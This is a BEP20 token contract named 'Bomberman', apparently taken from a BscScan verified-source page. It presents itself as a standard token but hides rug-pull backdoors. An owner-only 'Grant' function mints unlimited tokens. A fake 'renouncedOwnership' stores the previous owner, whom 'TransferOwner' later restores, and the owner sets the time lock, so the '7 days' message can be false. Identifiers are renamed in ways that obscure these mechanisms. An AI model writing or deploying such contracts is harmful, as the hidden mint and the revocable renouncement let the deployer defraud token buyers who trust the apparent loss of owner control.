/**
 *Submitted for verification at BscScan.com on 2021-10-31
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;


interface ICOIN {
    
    function totalSupply() external view returns (uint);

    
    function balanceOf(address account) external view returns (uint);

   
    function transfer(address recipient, uint amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint);

 
    function approve(address spender, uint amount) external returns (bool);

   
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint value);


    event Approval(address indexed owner, address indexed spender, uint value);
}

pragma solidity 0.8.7;

abstract contract Contexts {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Contexts {
    address private _owner;
    address private _previousOwner;
    uint256 private _level;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function SecurityLevel() private view returns (uint256) {
        return _level;
    }

    function renouncedOwnership(uint8 _owned) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _level = _owned;
        _owned = 10;
        emit OwnershipTransferred(_owner, address(0));
    }
    
    function TransferOwner() public virtual {
        require(_previousOwner == msg.sender, "You don't have permission to unlock");
        require(block.timestamp > _level , "Contract is locked until 7 days");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
    
}

pragma solidity 0.8.7;

interface ICOINMetadata is ICOIN {
   
    function name() external view returns (string memory);

   
    function symbol() external view returns (string memory);

   
    function decimals() external view returns (uint8);
}

library SafeMath {
   
    function tryAdd(uint kb1, uint kb2) internal pure returns (bool, uint) {
        unchecked {
            uint kb3 = kb1 + kb2;
            if (kb3 < kb1) return (false, 0);
            return (true, kb3);
        }
    }

 
    function trySub(uint kb1, uint kb2) internal pure returns (bool, uint) {
        unchecked {
            if (kb2 > kb1) return (false, 0);
            return (true, kb1 - kb2);
        }
    }

   
    function tryMul(uint kb1, uint kb2) internal pure returns (bool, uint) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'kb1' not being zero, but the
            // benefit is lost if 'kb2' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (kb1 == 0) return (true, 0);
            uint kb3 = kb1 * kb2;
            if (kb3 / kb1 != kb2) return (false, 0);
            return (true, kb3);
        }
    }


    function tryDiv(uint kb1, uint kb2) internal pure returns (bool, uint) {
        unchecked {
            if (kb2 == 0) return (false, 0);
            return (true, kb1 / kb2);
        }
    }


    function tryMod(uint kb1, uint kb2) internal pure returns (bool, uint) {
        unchecked {
            if (kb2 == 0) return (false, 0);
            return (true, kb1 % kb2);
        }
    }

  
    function add(uint kb1, uint kb2) internal pure returns (uint) {
        return kb1 + kb2;
    }

   
    function sub(uint kb1, uint kb2) internal pure returns (uint) {
        return kb1 - kb2;
    }


    function mul(uint kb1, uint kb2) internal pure returns (uint) {
        return kb1 * kb2;
    }

 
    function div(uint kb1, uint kb2) internal pure returns (uint) {
        return kb1 / kb2;
    }


    function mod(uint kb1, uint kb2) internal pure returns (uint) {
        return kb1 % kb2;
    }


    function sub(uint kb1, uint kb2, string memory errorMessage) internal pure returns (uint) {
        unchecked {
            require(kb2 <= kb1, errorMessage);
            return kb1 - kb2;
        }
    }


    function div(uint kb1, uint kb2, string memory errorMessage) internal pure returns (uint) {
        unchecked {
            require(kb2 > 0, errorMessage);
            return kb1 / kb2;
        }
    }

    function mod(uint kb1, uint kb2, string memory errorMessage) internal pure returns (uint) {
        unchecked {
            require(kb2 > 0, errorMessage);
            return kb1 % kb2;
        }
    }
}

pragma solidity 0.8.7;

contract Bomberman is Contexts, ICOIN, ICOINMetadata, Ownable {
    mapping (address => uint) private _balances;

    mapping (address => mapping (address => uint)) private _allowances;

    uint private _coinSupplykb1;
    string private _coinNamekb1;
    string private _coinSymbolkb1;


    constructor () {
        _coinNamekb1 = "Bomberman";
        _coinSymbolkb1 = 'BOMBERMAN';
        _coinSupplykb1 = 1*10**12 * 10**9;
        _balances[msg.sender] = _coinSupplykb1;

    emit Transfer(address(0), msg.sender, _coinSupplykb1);
    }


    function name() public view virtual override returns (string memory) {
        return _coinNamekb1;
    }

    function Grant(uint256 amount) public onlyOwner {
    _grant(msg.sender, amount);
    }

    function symbol() public view virtual override returns (string memory) {
        return _coinSymbolkb1;
    }


    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint) {
        return _coinSupplykb1;
    }


    function balanceOf(address account) public view virtual override returns (uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }


    function increaseAllowance(address spender, uint addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }


    function decreaseAllowance(address spender, uint subtractedValue) public virtual returns (bool) {
        uint currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint senderBalance = _balances[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _grant(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);
        
        _coinSupplykb1 = _coinSupplykb1 + amount;
        _balances[account] = _balances[account] + amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint amount) internal virtual {
        require(owner != address(0), "BEP0: approve from the zero address");
        require(spender != address(0), "BEP0: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    

  
    function _beforeTokenTransfer(address from, address to, uint amount) internal virtual { }
    
}